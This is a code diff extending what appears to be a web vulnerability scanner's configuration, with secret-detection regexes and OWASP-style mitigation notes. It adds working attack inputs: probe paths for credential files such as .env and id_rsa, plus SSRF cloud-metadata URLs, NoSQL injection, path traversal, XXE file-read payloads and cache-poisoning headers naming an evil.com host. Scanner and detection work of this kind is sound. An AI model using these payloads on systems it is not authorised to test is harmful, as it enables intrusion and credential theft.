@@ -181,10 +181,18 @@ WAF_SIGNATURES = {
 SECRET_REGEX = {
     "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
     "Amazon AWS Key": r"AKIA[0-9A-Z]{16}",
+    "AWS Secret Access Key": r"(?i)aws_(?:secret_)?(?:access_)?key[\s=:\'\"`]+([a-zA-Z0-9/+=]{40})",
+    "OpenAI API Key": r"sk-(?:proj-|live-)?[a-zA-Z0-9]{32,64}",
+    "HuggingFace Token": r"hf_[a-zA-Z0-9]{34}",
+    "SendGrid API Key": r"SG\.[a-zA-Z0-9_\-\.]{66}",
+    "Mailgun Private Key": r"key-[a-zA-Z0-9]{32}",
+    "Twilio Account SID / Key": r"(?:AC|SK)[a-f0-9]{32}",
+    "Firebase Database URL": r"https://[a-z0-9\-]+\.firebaseio\.com",
     "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24}",
     "Stripe Test Key": r"sk_test_[0-9a-zA-Z]{24}",
     "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
     "Slack Token": r"xox[bpa]-[0-9a-zA-Z]{10,48}",
+    "JWT Token (Hardcoded)": r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
     "Generic High Entropy (test)": r"['\"]([A-Za-z0-9+/]{30,60})['\"]"
 }
 
@@ -195,9 +203,65 @@ ADMIN_PATHS = [
 ]
 
 SENSITIVE_PATHS = [
-    "/.env", "/.git/config", "/.aws/credentials", "/.ssh/id_rsa",
-    "/config/config.json", "/backup.sql", "/db_backup.zip", "/app.log"
+    "/.env", "/.env.local", "/.env.production", "/.git/config", "/.aws/credentials", "/.ssh/id_rsa",
+    "/config/config.json", "/backup.sql", "/db_backup.zip", "/app.log",
+    "/docker-compose.yml", "/Dockerfile", "/web.config", "/server.xml",
+    "/phpinfo.php", "/wp-config.php.bak", "/package.json", "/.DS_Store",
+    "/storage/logs/laravel.log"
 ]
+
+# --- SSRF (Server-Side Request Forgery) Payloads ---
+SSRF_PAYLOADS = {
+    "AWS Metadata": "http://169.254.169.254/latest/meta-data/",
+    "GCP Metadata": "http://metadata.google.internal/computeMetadata/v1/",
+    "Localhost Loopback IPv4": "http://127.0.0.1:80/",
+    "Localhost Alternate": "http://localhost:8080/",
+    "IPv6 Loopback": "http://[::1]:80/"
+}
+
+# --- NoSQL Injection Payloads ---
+NOSQL_PAYLOADS = [
+    {"$ne": None},
+    {"$gt": ""},
+    "[$ne]=1",
+    "admin' || '1'=='1",
+    "true, $where: '1 == 1'"
+]
+
+# --- Path Traversal / LFI Payloads ---
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../../../../../etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "....//....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "../../../../../../windows/win.ini",
+    "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+]
+
+# --- XXE (XML External Entity) Payloads ---
+XXE_PAYLOADS = [
+    """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>""",
+    """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><name>&xxe;</name></root>"""
+]
+
+# --- Web Cache Poisoning & Deception Probes ---
+CACHE_POISONING_HEADERS = {
+    "X-Forwarded-Host": "attacker-cache-poison.evil.com",
+    "X-Host": "attacker-cache-poison.evil.com",
+    "X-Original-URL": "/admin",
+    "X-Rewrite-URL": "/admin"
+}
+
+# --- Insecure Deserialization Signatures ---
+SERIALIZATION_SIGNATURES = {
+    "Java Serialized Object": [rb"\xac\xed\x00\x05", "rO0AB"],
+    "PHP Serialized Object": [r'O:\d+:"', r'a:\d+:\{'],
+    "Python Pickle": [rb"cos\nsystem", rb"cposix\nsystem"],
+    "Node.js Serialize": [r"_$$ND_FUNC$$_"]
+}
+
+# --- Enterprise Cloud & Database Port Scan Profiles ---
+DEFAULT_PORTS_ENTERPRISE = [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
 
 OPEN_REDIRECT_PAYLOADS = [
     "http://google.com", "//google.com", "https://google.com"
@@ -296,4 +360,40 @@ MITIGATIONS = {
         "**Mitigation:** Context-aware output encoding is the primary defense. Encode all "
         "user-supplied data before rendering. A strong CSP is a powerful secondary defense."
     ),
+    "A08_Insecure_Deserialization": (
+        "**Info:** Insecure Deserialization occurs when untrusted serialized data is passed "
+        "to a backend parser, leading to Remote Code Execution (RCE) or state tampering.\n\n"
+        "**Mitigation:** Avoid accepting serialized objects from untrusted sources. Use safe data formats like JSON. "
+        "If serialization is necessary, implement cryptographic signature checks (HMAC)."
+    ),
+    "A08_XXE": (
+        "**Info:** XML External Entity (XXE) attacks occur when an XML parser evaluates external entity "
+        "declarations, allowing local file disclosure or internal network scanning.\n\n"
+        "**Mitigation:** Disable DTD (External Entities) resolution completely in XML parsers (`disallow-doctype-decl`)."
+    ),
+    "A10_SSRF": (
+        "**Info:** Server-Side Request Forgery (SSRF) allows attackers to coerce the web server into "
+        "making unintended requests to internal resources, cloud metadata (169.254.169.254), or loopback APIs.\n\n"
+        "**Mitigation:** Validate and sanitize all target URLs against a strict domain whitelist. "
+        "Block requests to private RFC 1918 and loopback IP ranges at the network and firewall layer. Disable IMDSv1 on AWS."
+    ),
+    "A03_Path_Traversal": (
+        "**Info:** Path Traversal (LFI) lets attackers access restricted server files (e.g. `/etc/passwd`, `win.ini`) "
+        "by manipulating file path variables with `../` sequences.\n\n"
+        "**Mitigation:** Avoid passing user input directly to filesystem APIs. Use basename validation, "
+        "canonical path checking (`realpath`), and an explicit whitelist of permissible file identifiers."
+    ),
+    "A03_NoSQL": (
+        "**Info:** NoSQL Injection occurs when query operators like `$gt` or `$ne` are accepted from user input, "
+        "bypassing database authentication or filtering.\n\n"
+        "**Mitigation:** Strictly cast and validate input types. Reject objects or arrays where scalar primitives are expected. "
+        "Use schema validation tools like Mongoose with strict filtering."
+    ),
+    "A05_Cache_Poisoning": (
+        "**Info:** Web Cache Poisoning manipulates caching proxies using unkeyed headers (e.g., `X-Forwarded-Host`) "
+        "to serve malicious cached payloads to other visitors.\n\n"
+        "**Mitigation:** Disable support for unkeyed host headers. Ensure proxy headers are strictly validated and overwritten "
+        "by reverse proxies, or incorporate headers into cache keys."
+    )
 }
+
